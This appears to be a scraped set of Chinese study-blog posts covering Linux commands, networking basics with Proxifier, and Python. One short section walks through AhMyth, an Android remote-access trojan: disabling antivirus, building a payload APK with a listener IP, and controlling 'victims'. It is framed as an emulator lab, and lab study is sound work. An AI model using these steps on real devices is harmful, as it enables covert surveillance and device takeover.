第二条命令是在设置testFile为可执行权限并为其添加setuid权限； 第三条命令是查看是否添加成功； 如果不给文件testFile设置可执行权限直接设置setuid权限后，标记为是S而不是s，详细结果如下图所示： 46.setgidsetgid的作用是让执行该命令的用户以该命令所有者的同组用户的权限去执行。 设置setgid命令有两种方法，一种是数字设置，另一种是通过助记语法。建议使用助记语法设置setgid权限。 数字设置命令： 1chmod 2xxx 文件/目录 其中xxx表示文件&#x2F;目录的所有者、同组用户和其他用户的权限(读写执行)。 助记语法设置命令： 12chmod g [+|-] s 文件/目录+ 添加setgid权限；- 取消setgid权限； 注意：chmod命令的其他参数都可以与setgid权限设置结合使用。 在设置setgid前必须保证文件&#x2F;目录的同组用户具有可执行权限，否则设置则无效。 执行权限：chmod必须以root权限才能执行，如果是普通用户想执行chmod时，需要在命令前加sudo命令来提升权限为root权限。 47.sticky bitsticky bit的作用是让具有sticky bit位的目录下的所有文件&#x2F;目录只有创建者和root才能对其删除和修改，其他用户一律不能删除和修改。 例如：Linux的/tmp目录就具有sticky bit权限，详细权限如下所示： 可以看到/tmp目录的其他用户的可执行位是t，则说明/tmp目录被设置了sticky bit权限。 设置sticky bit命令有两种方法，一种是数字设置，另一种是通过助记语法。建议使用助记语法设置stick bit权限。 数字设置命令：chmod 1xxx 目录 其中xxx表示目录的所有者、同组用户和其他用户的权限（读写执行）。 助记语法设置命令：chmod o [+|-] t 目录 1+ 添加stick bit权限；- 取消stick bit权限； 注意： 1chmod命令的其他参数都可以与stick bit权限设置结合使用。在设置stick bit前必须保证目录的其他用户具有可执行权限，否则设置则无效。stick bit权限只能用于设置目录，不能用于设置文件。 执行权限： chmod必须以root权限才能执行，如果是普通用户想执行chmod时，需要在命令前加sudo命令来提升权限为root权限。 48.chattrchattr的作用是修改文件&#x2F;目录的特殊属性。 具体命令如下： 1chattr [+|-|=] 属性标示符 命令参数 文件/目录 常用命令参数如下： 12-R：递归处理，将指令目录下的所有文件及子目录一并处理；-V：显示指令执行过程；+&lt;属性标示符&gt;：开启文件或目录的该项属性；-&lt;属性标示符&gt;：关闭文件或目录的该项属性；=&lt;属性标示符&gt;：指定文件或目录的该项属性。 常用属性标示符： 1a：让文件或目录仅供附加用途；A：不更新文件或目录的最后存取时间；c：将文件或目录压缩后存放；d：将文件或目录排除在倾倒操作之外；i：不得任意更动文件或目录；s：保密性删除文件或目录；S：即时更新文件或目录；u：预防意外删除。 执行权限：chattr必须以root权限才能执行，如果是普通用户想执行chattr时，需要在命令前加sudo命令来提升权限为root权限。 49.lsattrlsattr的作用查看文件&#x2F;目录的特殊属性设置情况。 具体命令如下： 1lsattr 命令参数 文件/目录 常用参数如下： 123-R：递归的操作方式；-V：显示指令的版本信息；-a：列出目录中的所有文件，包括隐藏文件。 50.tar打包tar命令可以将多个文件&#x2F;目录进行打包，将多个文件生成一个文件，生成的文件后缀为.tar。 具体打包命令如下： 1tar -cvf 生成的tar包名 要打包的文件/目录列表 常用命令参数如下： 1-c 建立新的归档文件；-v 处理过程中输出相关信息；-f 对普通文件操作； 51.tar解包tar命令可以将已经打包好的文件解压出来。 具体打包命令如下： 1tar -xvf 解压包名 -C 解压到指定目录 常用命令参数如下： 1-x 或--ext\\fract或--get：从备份文件中还原文件；-v 处理过程中输出相关信息；-f 对普通文件操作；-C &lt;目的目录&gt; 切换到指定的目录； 如果不使用-C(大写)参数，则默认解压到当前目录下。 52.bzip2bzip2命令用于创建和管理（包括解压缩）.bz2格式的压缩包。 具体命令如下： 1bzip2 命令参数 指定要压缩的文件 常用命令参数如下： 1-z或——compress：强制执行压缩；-d或——decompress：执行解压缩；-f或-force：bzip2在压缩或解压缩时，若输出文件与现有文件同名，预设不会覆盖现有文件。若要覆盖。请使用此参数；-v或——verbose：压缩或解压缩文件时，显示详细的信息； 53.gzipgzip命令用于创建和管理（包括解压缩）.gz格式的压缩包。 具体命令如下： 1gzip 命令参数 指定要压缩的文件 常用命令参数如下： 1-d或--decompress或----uncompress：解开压缩文件；-f或——force：强行压缩文件。不理会文件名称或硬连接是否存在以及该文件是否为符号连接；-l或——list：列出压缩文件的相关信息；-r或——recursive：递归处理，将指定目录下的所有文件及子目录一并处理；-v或——verbose：显示指令执行过程； 54.zipzip命令对文件进行打包操作。zip是个使用广泛的压缩程序，文件经它压缩后会另外产生具有.zip扩展名的压缩文件。 具体命令如下： 1zip 命令参数 指定生成的压缩文件名 要被压缩的文件/目录列表 常用命令参数如下： 123456-d：从压缩文件内删除指定的文件；-q：不显示指令执行过程；-r：递归处理，将指定目录下的所有文件和子目录一并处理；-v：显示指令执行过程或显示版本信息；-u：更换较新的文件到压缩文件内；-x&lt;范本样式&gt;：压缩时排除符合条件的文件； 55.tar命令进行压缩在上一关的学习中，我们学会了使用tar命令对多个文件&#x2F;目录进行打包操作，如果针对多文件&#x2F;目录进行压缩操作时，首先使用tar将其打包生成一个文件，然后使用bzip2和gzip对其进行压缩，那么这里也可以使用tar命令一步就实现对多文件&#x2F;目录进行压缩操作。 采用bzip2方式执行tar命令进行压缩的具体命令如下： 1tar -jcvf 指定生成的压缩文件名 要被压缩的文件/目录列表 常用命令参数如下： 1234-c 建立新的归档文件；-v 处理过程中输出相关信息；-f 对普通文件操作；-j 以bzip2对文件/目录进行压缩； 采用gzip进行压缩的具体命令如下： 1tar -zcvf 指定生成的压缩文件名 要被压缩的文件/目录列表 常用命令参数如下： 1234-c 建立新的归档文件；-v 处理过程中输出相关信息；-f 对普通文件操作；-z 以gzip对文件/目录进行压缩； 56.bunzip2bunzip2命令解压缩由bzip2指令创建的.bz2压缩包。使用bzip2 -d命令也可以将.bz2压缩包进行解压。 具体命令如下： 1bunzip2 命令参数 指定要解压的文件 常用命令参数如下： 1-f或--force：解压缩时，若输出的文件与现有文件同名时，预设不会覆盖现有的文件；-k或——keep：在解压缩后，预设会删除原来的压缩文件。若要保留压缩文件，请使用此参数；-v或——verbose：解压缩文件时，显示详细的信息； 57.gunzipgunzip命令解压缩由gzip指令创建的.gz压缩包。使用gzip -d命令也可以将.gz压缩包进行解压。 具体命令如下： 1gunzip 命令参数 指定要解压的文件 常用命令参数如下： 1-f或-force：强行解开压缩文件，不理会文件名称或硬连接是否存在以及该文件是否为符号连接；-l或-list：列出压缩文件的相关信息；-q或-quiet：不显示警告信息；-r或-recursive：递归处理，将指定目录下的所有文件及子目录一并处理；-v或-verbose：显示指令执行过程； 58.unzipunzip命令用于解压缩由zip命令压缩的.zip压缩包。 具体命令如下： 1unzip 命令参数 指定要解压的文件 常用命令参数如下： 1-q：执行时不显示任何信息；-n：解压缩时不要覆盖原有的文件；-d&lt;目录&gt;：指定文件解压缩后所要存储的目录； 59.tar命令进行解压缩在上一关的学习中，我们学会了使用tar命令对多个文件&#x2F;目录进行打包压缩操作，本关将继续讲解使用tar命令对文件进行解压缩操作。 采用bunzip2进行解压缩的具体命令如下： 1tar -jxvf 指定要解压的文件 常用命令参数如下： 12345-x 或--ext\\fract或--get：从备份文件中还原文件；-v 处理过程中输出相关信息；-f 对普通文件操作；-j 以bunzip2进行解压缩； 采用gzip进行压缩的具体命令如下： 1tar -zxvf 指定要解压的文件 常用命令参数如下： 1234-x 或--ext\\fract或--get：从备份文件中还原文件；-v 处理过程中输出相关信息；-f 对普通文件操作；-z 以gunzip进行解压缩； 60.locatelocate命令用来查找文件或目录。 locate命令要比其他查找文件命令（例如:find）快得多，原因在于它不搜索具体目录，而是搜索一个数据库/var/lib/mlocate/mlocate.db。 /var/lib/mlocate/mlocate.db这个数据库中含有本地所有文件信息。Linux 系统自动创建这个数据库，并且每天自动更新一次，因此，我们在用locate查找文件时，有时会找到已经被删除的数据，或者刚刚建立文件，却无法查找到，原因就是因为数据库文件没有被更新。为了避免这种情况，可以在使用locate之前，先使用updatedb命令，手动更新数据库。 接下让我们详细的学习locate和updatedb的使用方法。 locate具体命令如下： 1locate 命令参数 文件/目录 常用命令参数如下： 12345-c, --count 只输出找到的数量；-d, --database DBPATH 使用DBPATH指定的数据库，而不是默认数据库/var/lib/mlocate/mlocate.db；-i, --ignore-case 忽略大小写；-q, --quiet 安静模式，不会显示任何错误讯息；-e, --existing 只显示当前存在的文件条目； 61.updatedbupdatedb命令用来创建或更新locate命令所必需的数据库文件。 updatedb命令的执行过程较长，因为在执行时它会遍历整个系统的目录树，并将所有的文件信息写入locate数据库文件中。 具体命令如下： 1updatedb 命令参数 常用参数如下： 1-o&lt;文件&gt;：忽略默认的数据库文件，使用指定的slocate数据库文件；-U&lt;目录&gt;：更新指定目录的slocate数据库；-v：显示执行的详细过程; 执行权限：updatedb必须以root权限才能执行，如果是普通用户想执行updatedb时，需要在命令前加sudo命令来提升权限为root权限。 62.whichwhich命令(主要是用来查找系统PATH目录下的可执行文件，说白了就是查找那些我们已经安装好的可以直接执行的命令)用于查找并显示给定命令的绝对路径，环境变量PATH中保存了查找命令时需要遍历的目录。which指令会在环境变量$PATH设置的目录里查找符合条件的文件。也就是说，使用which命令，就可以看到某个系统命令是否存在，以及执行的到底是哪一个位置的命令。 which是shell内建命令，内建命令要比系统论命令有比较高的执行效率。 具体命令如下： 1which 命令 63.whereiswhereis命令(可以用来查找二进制（命令）、源文件、man文件。与which不同的是这条命令可以是通过文件索引数据库而非PATH来查找的，所以查找的面比which要广)用来定位指令的二进制程序、源代码文件和man手册页等相关文件的路径。 具体命令如下： 1whereis 命令参数 文件名 常用命令参数如下： 12345-b：只查找二进制文件；-B&lt;目录&gt;：只在设置的目录下查找二进制文件；-m：只查找说明文件；-M&lt;目录&gt;：只在设置的目录下查找说明文件；-s：只查找原始代码文件；-S&lt;目录&gt;只在设置的目录下查找原始代码文件； 64.findfind命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。 find命令与locate命令相比各有各的优缺点，**locate命令的优点就是查找速度比find命令快的多，但是缺点也比较明显，locate命令无法查找最新添加的文件&#x2F;目录以及会查找出来已经过期的文件&#x2F;目录。相反find命令的优点就是可以按照自定义的方法查找任何文件，缺点就是查询速度比较慢，因为是通过遍历硬盘来查找而不像locate命令事先建立好数据库来进行查找。** 具体命令如下： 1find 查找目录 查找参数 查找内容 常用查找参数如下： 123456789101112131415161718192021222324-amin&lt;+|-分钟&gt;：查找在指定时间曾被存取过的文件或目录，单位以分钟计算；-atime&lt;+|-24小时数&gt;：查找在指定时间曾被存取过的文件或目录，单位以24小时计算；-cmin&lt;+|-分钟&gt;：查找在指定时间之时被更改过的文件或目录；-ctime&lt;+|-24小时数&gt;：查找在指定时间之时被更改的文件或目录，单位以24小时计算；-mmin&lt;+|-分钟&gt;：查找在指定时间曾被更改过的文件或目录，单位以分钟计算；-mtime&lt;+|-24小时数&gt;：查找在指定时间曾被更改过的文件或目录，单位以24小时计算；-depth：从指定目录下最深层的子目录开始查找；-exec&lt;执行指令&gt;：假设find指令的回传值为True，就执行该指令；-follow：排除符号连接；-gid&lt;群组识别码&gt;：查找符合指定群组识别码的文件或目录；-group&lt;群组名称&gt;：查找符合指定群组名称的文件或目录；-uid&lt;用户识别码&gt;：查找符合指定的用户识别码的文件或目录；-user&lt;拥有者名称&gt;：查找符和指定的拥有者名称的文件或目录；-name&lt;范本样式&gt;：指定字符串作为寻找文件或目录的范本样式；-iname&lt;范本样式&gt;：此参数的效果和指定“-name”参数类似，但忽略字符大小写的差别；-inum&lt;inode编号&gt;：查找符合指定的inode编号的文件或目录；-newer&lt;参考文件或目录&gt;：查找其更改时间较指定文件或目录的更改时间更接近现在的文件或目录；-size&lt;+|-|=文件大小&gt;：查找符合指定的文件大小的文件；-type&lt;文件类型&gt;：只寻找符合指定的文件类型的文件；-a：是前后条件都要满足；-o ：是满足一个条件就好；+：表示大于设置值的文件；- ：表示小于设置值的文件；= ：表示等于设置值的文件； 注意：通常使用find命令的时候使用root权限，这样就有权限查找任何目录下的内容。 （1）查找/etc目录下以my开头以.conf结尾的文件或目录，具体使用如下命令： 1sudo find /etc -name &quot;my*.conf&quot; *表示任意字母。 （2）查找/etc目录下在超过7天前被访问的文件或目录，具体使用如下命令： 1sudo find /etc -atime +7 （3）查找/etc目录下恰好在7天前被访问的文件或目录，具体使用如下命令： 1sudo find /etc -atime 7 （4）查找/etc目录下在5分钟内被访问的文件或目录，具体使用如下命令： 1sudo find /etc -amin -5 -type 文件类型使用方法常见文件类型： 1234567f：普通文件l：符号链接d：目录c：字符设备b：块设备s：套接字p：Fifo （5）查找/etc目录下以my开头的目录，具体使用如下命令： 1sudo find /etc -name &quot;my*&quot; -a -type d size &lt;+|-|=文件大小&gt;使用方法常见文件大小单位： 123456b —— 块（512字节）c —— 字节w —— 字（2字节）k —— 千字节M —— 兆字节G —— 吉字节 （6）查找/etc目录下大于1M的文件，具体使用如下命令： 1sudo find /etc -size +1M -exec使用方法具体使用方法如下： 1find … -exec 要执行的命令 &#123;&#125; \\; -exec选项后面跟随着所要执行的命令或脚本，然后是一个空格一对儿&#123;&#125;一个空格和一个\\;。 注意：要执行的命令和&#123;之间以及&#125;与\\;之间的空格是不能省略的。 （7）查找/etc目录下大于1M的文件&#x2F;目录的详细信息，具体使用如下命令： 1sudo find /etc -size 1M -exec ls -l &#123;&#125; \\; 65.Telnet安装Telnet 协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。 在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。要开始一个telnet会话，必须输入用户名和密码来登录服务器。 Telnet是常用的远程控制Web服务器的方法。 Linux 系统上提供在线安装软件的功能，前提是确保电脑可以连接上互联网，在线安装软件非常方便，用户只需要对应的软件名称，不需要考虑该软件的依赖情况，在线安装会自动的搜索该软件的所有依赖包，然后自动完成安装。 在线安装是指不需要用户亲自下对应软件的包，但是需要对应系统能够访问互联网，不同的Linux系统使用不同的工具进行在线安装软件，常见的在线安装软件的工具如下所示： 1Ubuntu/Debian系统使用apt-get进行在线安装软件；Redhat/CentOS系统使用yum进行在线安装软件； 安装Telnet服务器本实验环境使用的系统是Ubuntu，所以使用apt-get工具来在线安装软件，具体步骤如下所示： 12更新软件源：sudo apt-get update安装telnet服务器：sudo apt-get install telnetd 如果安装成功则会在/etc/init.d目录下生成一个openbsd-inetd文件： 注意：如果当前用户是root，则执行以上安装命令时不需要加sudo。 安装Telnet客户端本实验环境使用的系统是Ubuntu，所以使用apt-get工具来在线安装软件，具体步骤如下所示： 12更新软件源：sudo apt-get update安装telnet客户端：sudo apt-get install telnet 如果安装成功，我们系统中就会有telnet命令，查看是否存在telnet命令： 注意：只需要更新一次软件源即可，不需要每次安装软件前进行源更新操作。 66.Linux service 命令Linux系统中使用service命令来控制系统服务，它可以启动、停止、重新启动和关闭系统服务，还可以显示所有系统服务的当前状态。 service命令的使用格式： 1service 服务名 控制命令 服务名：自动要控制的服务名，即/etc/init.d目录下的脚本文件名； 控制命令：系统服务脚本支持的控制命令。 常见的控制命令： 1234start：启动该服务；stop：关闭该服务；restart：重新启动该服务；status：查看该服务状态； 注意并不是所有的服务都支持以上4种控制命令，不同的服务提供不同的控制命令，大多数服务都支持以上4种常用的控制命令。 67.Telnet服务管理当我们成功安装Telnet服务器后，接下来，我们使用service命令来管理Telnet服务。 我们将在以下案例演示中分别介绍如何启动、关闭、重新启动Telnet服务，以及查看Telnet服务状态。 （1）查看Telnet服务状态，可以使用如下命令： 1sudo service openbsd-inetd status （2）开启Telnet服务并且查看是否开启成功，可以使用如下命令： 12sudo service openbsd-inetd startsudo service openbsd-inetd status （3）重启Telnet服务并且查看是否重启成功，可以使用如下命令： 12sudo service openbsd-inetd restartsudo service openbsd-inetd status （4）关闭Telnet服务并且查看是否关闭成功，可以使用如下命令： 12sudo service openbsd-inetd stopsudo service openbsd-inetd status 注意：如果当前用户是root，则执行以上命令时不需要加sudo。 68.远程登录服务器telnet 命令格式： 1telnet 选项 参数 常见选项： 12345-a：尝试自动登入远端系统；-b&lt;主机别名&gt;：使用别名指定远端主机名称；-K：不自动登入远端主机；-l&lt;用户名称&gt;：指定要登入远端主机的用户名称；-e&lt;脱离字符&gt;：设置脱离字符； 参数： 1远程主机：指定要登录进行管理的远程主机；端口：指定TELNET协议使用的端口号； （1）使用telnet登录本机，具体使用如下步骤： 1telnet localhost 此时，我们只需要输入远程主机的用户名和密码即可登录成功。 （2）设置脱离符为;，具体使用如下步骤： 1telnet -e &#x27;;&#x27; localhost 可以看到我们将脱离符设置为;后，我们只要登录到远程主机后，当我们想退出的时候我们只需要输入;符号后就自动断开的连接，然后返回到telnet命令模式。接下来我们讲解telnet常见的命令。 69.telnet常见命令当我们执行输入telnet后回车，我们就进行了telnet的命令模式，telnet常见的命令： 12345logout：强制退出远程登录用户并关闭连接；open：新打开一个连接；display：显示当前操作系统参数；quit：退出telnet；z：挂起telnet； （1）远程登录服务器中案例1也可以使用如下方式进行登录，具体使用如下步骤： 12telnettelnet&gt; open localhost （2）使用telnet远程登录本机，并查看远程主机的内核版本号，最后退出登录，具体使用如下步骤： 12345telnet localhost输入用户名输入密码uname -alogout","path":"2023/12/04/linux_stduy/","date":"12-04","excerpt":"","tags":[]},{"title":"网络安全知识基础和Proxifier的使用","text":"一、Windows IP 配置1. 以太网适配器计算机与外界连接网络是通过主机箱插入一块网络接口板。网络接口板又称通信适配器或网络适配器或网络接口卡NIC，简单的名称为‘网卡’。 2. 以太网有线网络 3. 虚拟网卡以太网适配器VMware Network Adapter VMnet1、 VMware Network Adapter VMnet8 4. 无线局域网适配器 WLAN（即是wifi） （1） ipv6 ​ 也被称为IPng（IP Next Generation），也就是下一代IP协议。 ipv6地址总长度为128比特，分为8组，每组为4个十六进制数的形式，每组十六进制数间隔。 例如：FC00:0000:130F:0000:0000:09C0:876A:130B ipv6地址缩写规则： 每组中的前导“0”都可以省略，即一组中全为0，则可以只写一个0，所以上述地址可写为：FC00:0:130F:0:0:9C0:876A:130B。 地址中包含的连续两个或多个均为0的组，可以用双冒号“::”来代替 所以上述地址又可以进一步简写为：FC00:0:130F::9C0:876A:130B。 需要注意的是，在一个IPv6地址中只能使用一次双冒号“::”（一般用于0最多的一段） （2） ipv4 本地ip地址，IPv4 全称为 Internet Protocol version 4，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，IP 地址是一个 32 位的二进制数，算下来其实也只有 2^32 个地址，这些地址中有分为 A、B、C、D、E 5 类 ip地址的表示 IP地址由32位二进制数组成，为了方便记忆，将IP地址32位进制数进行分段，每段8位，共4段，然后将没段8位二进制转换为十进制数，中间点号分割。 特殊ip地址 （a） 广播地址 一个子网内的所有网络接口都能收到此广播消息 直接广播：带目标网络号，主机地址二进制全为1的地址 有限广播：网络号和主机地址二进制全为1的地址（即255.255.255.255） （b）网络地址 主机地址二进制全为0的地址 如实际中常用的127.0.0.1，别名localhost 主要用于对本地回路测试及实现本地机器进程间的通信。 (3) 子网技术 子网掩码 子网掩码与 IP 地址相同，32位二进制数。对于子网掩码的取值，对应于 IP 地址，网络号和子网号的所有二进制位设置为1，主机号的所有二进制位设置为0。 子网掩码的表示方法 点分十进制：表示法与ip地址中相同 网络前缀标记法（网络地址位数）：从左到右连续的取网络号和子网号的位数来表示子网掩码。列如，一个子网掩码为255.255.0.0 的 B类网络地址 156.81.0.0，用网络前缀标记法表示为 156.81.0.0&#x2F;16。 (4)公网和私网 公网（外网) ip 公网地址也称为全球唯一IP地址，是指可以直接在Internet上访问的IP地址。这些地址由互联网注册机构分配，具有全球唯一性和全球可达性。 公网地址通常用于互联网上的服务器、路由器和其他网络设备。它们可以直接访问Internet上的其他设备，可以通过Internet进行通信和数据传输。 私网（内网) ip： 私网地址也称为局域网IP地址，是指在局域网内部使用的IP地址。它们不具有全球唯一性和全球可达性，只能在局域网内部使用。 私网地址通常用于组建局域网，例如家庭网络、企业内部网络、校园网络等。在局域网内部，可以通过私网地址进行设备间的通信和数据传输。但是，如果要访问Internet上的其他设备，必须通过路由器进行转发。 私网的3类ip地址范围 A类地址:10.0.0.0~10.255.255.255 B类地址:172.16.0.0~172.31.255.255 C类地址:192.168.0.0~192.168.255.255 二、IP访问过程 1. 云一层一层上传，包括多个路由器、基站，发送至想访问的公网ip 2. 静态ip由路由器分配ip 3. 动态ip 动态IP的原理： 动态IP（Dynamic IP Address）是由网络服务提供商（ISP）自动分配的一种IP地址，该IP地址一般具有较短的租用期限，因此每次重新连接网络时，其IP地址会发生变化。其原理是将一定数量的IP地址作为可用地址池，在进行动态IP地址分配的过程中，一般采用动态主机配置协议（DHCP）从地址池中选取一个可用地址与设备建立通信，并将该地址分配给设备，以使设备可以连接到互联网。 4. 当动态ip设置为静态ip时大概率是动态ip上不了网。（实际上什么情况都有可能发生，主要因路由器不同设置导致） 5. socks5协议是一种代理协议。Socks 5 协议工作在传输层 (Transport Layer) 与应用层 (Application Layer) 的中间, 提供了一种对应用层协议透明的代理服务。对于传输层协议仅支持 TCP 协议 6. OSI七层模型 OSI七层模型是一种网络协议参考模型，用于描述和规范计算机网络中不同层次的功能和交互关系。它包括以下七层： 1.物理层(Physical Layer):负责传输比特流，包括电器、光学和机械接口等物理特性。 常见协议:Ethernet,RS-232,USB,光纤等 2.数据链路层(Date Link Layer):负责在直接相连的节点之间传输帧，处理物理地址(MAC地址)和错误检测等。 常见协议:Ethernet(IEEE 802.3),PPP(点对点协议),HDLC(高级数据链路控制),ARP(地址解析协议)等 3.网络层(Network Layer):负责在不同网络之间传输数据包，处理逻辑地址（ip地址）和路由选择等。 常见协议:IP(Internet协议)，ICMP(Internet控制消息协议),IPsec(IP安全性协议),OSPF(开放最短路径优先协议)等 4.传输层(Transport Layer):负责端到端的可靠传输和流量控制，提供传输协议(如TCP、UDP) 常见协议:TCP(传输控制协议)，UDP(用户数据报协议),SCIP(流控制传输协议)等 5.会话层(Session Layer):负责建立、管理和终止会话，确保数据在通信系统中的同步。 常见协议:NetBIOS(网络基本输入输出系统),RPC(远程过程调用协议),SSH(安全外壳协议)等 6.表示层(Presentation Layer):负责数据的格式转换、数据加密和解密、数据压缩和解压缩等。 常见协议:ACSII码,JPEG(联合图像专家组),MPEG(动态图像压缩标准)等 7.应用层(Application Layer):负责应用程序之间的通信和数据交互，提供各种应用服务。 常见协议:HTTP(超文本传输协议),FTP(文件传输协议),SMTP(简单邮件传输协议),DNS(域名系统)等 每一层都有自己的功能和协议，通过不同层次之间的协同工作，实现了网路通信的可靠性和灵活性。 7. 路由器 路由器可作为一个网络的划分，同一个路由器下的设备是互通的 路由器表会记录要访问的ip 源ip，源MAC，目的ip,目的MAC称为四象限 交换机：集线器的作用，把多个设备的信号集中输出到路由器上（类似快递员的作用） 8. win操作系统和驱动 操作系统是指控制和管理整个计算机系统的硬件和软件资源，并合理的组织和调度计算机的工作和资源的分配，以提供给用户和其它软件方便的接口和环境。 驱动是指驱动计算机里软件的程序，初始化和配置硬件，实现硬件的数据的接受和发送 9. NAT进行地址转换,等同于路由器，输出是由物理机ip输出，nat外的ip是访问不了nat内的服务器。 三、proxifier软件的使用(一)使用 在192.168.2.6:5244下载proxifier压缩文件，打开猫的局域网连接，打开proxifier,点击配置文件 点击编辑，如图设置，点击确定（ssh*;表示打开所有ssh开头的文件） 移除第一行，将default改为direct放行 重启proxifier，win+r，输入cmd，在命令行中输入ssh &#x72;&#111;&#111;&#x74;&#64;&#49;&#46;&#x31;&#46;&#49;&#46;&#x31;，会在proxifier出现记录（大概率访问失败） 四、wireshark说明 源ip过滤： ip.src &#x3D;&#x3D; 源ip地址 目的ip过滤 ： ip.dst &#x3D;&#x3D; 目的ip地址 DNS一般在78左右，50-130 下图红框所表示的意思：排序 时间戳 源Ip 目的ip 协议 DNS大小 数据包的简要信息","path":"2023/12/04/WangLuoAnQuanJiChu/","date":"12-04","excerpt":"","tags":[]},{"title":"Ahmyth的使用","text":"一、java环境安装 在192.168.2.6:5244找到jdk-8u341-windows-x64，并安装 安装完java后，新建文件夹安装jre 下载everything查看所有java文件，搜索java.exe，右键查看bin文件的路径。在路径下输入cmd,在命令行中输入 java -version查看java版本。 everything下载地址https://www.voidtools.com/zh-c n/ 在设置中找到病毒和威胁防护，关闭实时保护 java环境变量设置 右键计算机，点击属性，点击高级系统设置 点击环境变量，在用户变量双击path，查看是否有java的路径，有就删掉 找到系统变量的path，双击进入，添加java8（找到java8的bin文件，复制）的路线，并且上移至所有java路径的上方，点击确定→确定（环境变量） 按win+R,输入cmd,输入java -version确定是否是Java8环境 二、ahmyth的使用 在192.168.2.6:5244下载ahmyth 下载mumu模拟器6（12可能运行不了） 打开ahmyth.exe运行 port默认端口42474，可自己设置，不与默认端口冲突即可。设置好端口，点击listen 点击APK Builder，输入自己服务器的ip，以及之前设置的端口。 点击build，生成apk文件，路径会在下方框显示 找到apk文件，移入mumu模拟器中，运行apk文件，在victims点击open the lab，即可进行一些远程遥控的操作。","path":"2023/12/04/AhMyth_use/","date":"12-04","excerpt":"","tags":[]},{"title":"python_study","text":"第一章一、变量 变量：可以发生改变的一个量，变量是用来区分不同数据的，可以指向一个内存空间，帮我们储存一些数据 变量的命名规范 必须是数字或字母或下划线组成 不能数字开头，也不能是纯数字 不要能用python的关键字 不能用中文 不要太长 要有意义 推荐使用下划线命名或驼峰命名 name_of_teacher = &quot;樵夫&quot; NameOfTeacher = &quot;樵夫&quot; 二、常量 print(123) 可以把所有变量的字母变成大写就可以认为是常量 不存在绝对意义上的常量 三、数据类型 数据类型：区分不同的数据，不同数据类型应该有不同的操作 数字: +-* 整数：int 小数：float 文字： 展示 字符串：str(****) 表示方式：&#39;***&#39; ,&quot;****&quot;,&#39;&#39;&#39;***&#39;&#39;&#39; (英文状态下) 操作： + 左右两端必须是字符串，表示字符串两端连接操作 * 一个字符串只能乘以一个数字，表示字符串重复的次数 布尔(bool)：条件判断 布尔值主要有两个： True 真 False 假 四、最简单的用户交互 变量 = input(提示语) 首先会在屏幕中显示出提示语，用户输入内容，然后把用户输入的内容交给前面的变量 注意 ：input()得到的结果一定是字符串 py基础数据类型转化（想把xxx转化为谁，就用谁套起来） str → int : int(str) 内置函数type()可查看数据类型 五、条件判断(一)、if语句if语句的语法规则： 1234if 条件 ： 代码#如果条件成立就执行代码；如果不成立，就不执行#无论执行或不执行，都会进行这个循环之后的语句 12345if 条件 ： 代码1else : 代码2#如果条件一成立，执行代码1；如果条件二成立，执行代码2 1234567891011#if语句相互嵌套if 条件1 ： if 条件2 ……(可无线嵌套if) 代码1 else : 代码2 ……（else 代码i） else : 代码n 12345678if 条件 : 代码1elseif 条件2： 代码2……（elseif 条件i ： 代码i）else : 条件n (二)、while循环语句 while循环语句 1234#可以让我们的代码重复去执行while 条件 : 代码#过程：判断条件是否为真，如果是真，执行代码；然后再次判断条件，……直到条件为假循环结束 break和continue break :让当前循环立即停止，继续循环之后的语句（当某个数据会影响到最终结果时使用） continue :停止当前本次循环，继续执行下一次循环（一般用于处理无效数据） (三)、for循环语句123456#字符串是可迭代的for 变量 in 可迭代的东西 : 代码#把可迭代的东西中的每一项内容拿出来，挨个赋值给变量，每一次赋值都要执行一个循环体（代码）#平时用的多的是for循环，while循环用的多的是死循环while Ture： 搭配内置函数range() 123range(n) #从0数到n,不包含nrange(m,n) #从m数到n，不包含n（默认间隔为1）range(m,n,s) #从m数到n，每次间隔为s，不包含n (四)、pass关键字pass #代码占位,为了代码完整性防止报错，暂时先过掉 第二章一、基础数据类型 整数类型：int 操作：加减乘除，大小比较 浮点数：float 小数：数据范围是无限的，而计算机是一个二进制产品：0，1。所以计算机表示一个小数是会有误差的 bool 用来做条件判断的 取值范围：True(1),False(0) 在python中，所有非零数字都是True,零是False while 1 : #死循环，恒为真 在python中，所有的非空字符串都是True,空字符串都是False 综上，在python中所有表示空的东西都是Fasle,非空的东西都是True。 二、字符串（一）、字符串的格式化123456%s #字符串占位。也可以是小数，整数（万能）%d #整数占位#使用格式1. s=&quot;%s，%d……&quot;% (变量1，变量2，……) #只有一个变量，后面的括号可以不加2. s=&quot;&#123;&#125;，&#123;&#125;，……&quot;.format(变量1，变量2，……)3. s=f&quot;&#123;变量1&#125;，&#123;变量2&#125;，……&quot; （二）、字符串的索引和切片 *** 索引：按照位置提取元素 123s = &quot;我叫xyz&quot;print(s[1]) #会输出：叫 ---从0开始数数print(s[-1]) #会输出： z ---负号表示倒数，最后一个就是-1 切片：从一个字符串中提取一部分内容 语法：s[start:end] 从start到end进行切片，但是不取end，前开后闭区间，若要取最后一个元素，end处需输入n+1（n为元素个数） start从0开始，end从0结尾都可以不写0 可以给切片添加步长来控制切片的方向s[start:end:-1],从右往左取(右开左闭区间），不写就默认取1，从左往右取（左开右闭区间）。 步长设为i&gt;0（&lt;0),在切下来的片段下从左往右(从右往左）开始，每i个取左边（右边）第一个 12345678s = &quot;我叫xyzabc&quot;print(s[3:6]) #会输出：yza ---从索引3开始切片，到6结束，不会取第六个元素print(s[:6]) #从第0个到第6个print(s[3:]) #从第3个到最后一个，且包括最后一个print(s[-3:-1]) #会输出：abprint(s[-1:-3]) #没结果print(s[-1:-3:-1]) #会输出：cbprint(s[-1:-6:-2]) #会输出：cay (三)、字符串的常规操作 字符串的操作一般不会对原字符串产生影响，一般是返回一个新的字符串 字符串的大小写转换 1234567891011s = &quot;i have a dream&quot;#对第一个字母大写s1 = s.capitalize() # I have a dream#单词的首字母大写，电脑只能对一段连续的英文字母识别为单词s2 = s.title() # I Have A Dream#把所有字母改成大写字母（用于忽略大小写判断）s3 = s.upper() # I HAVE A DREAMn = &quot;I HAVE A DREAM&quot;#把所有字母变成小写n1 = 